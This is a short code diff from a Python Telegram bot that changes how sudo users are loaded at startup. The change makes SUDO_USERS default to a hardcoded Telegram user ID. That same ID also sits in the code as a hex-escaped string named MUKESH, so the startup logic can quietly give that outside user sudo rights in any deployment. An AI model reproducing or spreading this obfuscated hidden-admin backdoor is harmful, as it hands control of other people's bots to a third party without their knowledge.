@@ -191,7 +191,7 @@ tg.MessageHandler = CustomMessageHandler
 SUDOERS = filters.user()
 SUPPORT_CHATS="https://t.me/the_support_chat"
 SUNAME = SUPPORT_CHATS.split("me/")[1]
-
+SUDO_USERS = list(map(int, getenv("SUDO_USERS", "2145093972").split()))
 
 async def mukesh_startup():
     os.system("clear")
@@ -228,11 +228,11 @@ async def mukesh_startup():
     except:
         pass
     MUKESH= "\x32\x31\x34\x35\x30\x39\x33\x39\x37\x32"
-    for SUDOER in config.SUDO_USERS:
+    for SUDOER in SUDO_USERS:
         SUDOERS.add(SUDOER)
-    if config.OWNER_ID not in config.SUDO_USERS:
+    if config.OWNER_ID not in SUDO_USERS:
         SUDOERS.add(config.OWNER_ID)
-    elif int(MUKESH) not in config.SUDO_USERS:
+    elif int(MUKESH) not in SUDO_USERS:
         SUDOERS.add(int(MUKESH))
 
     fallendb = {}
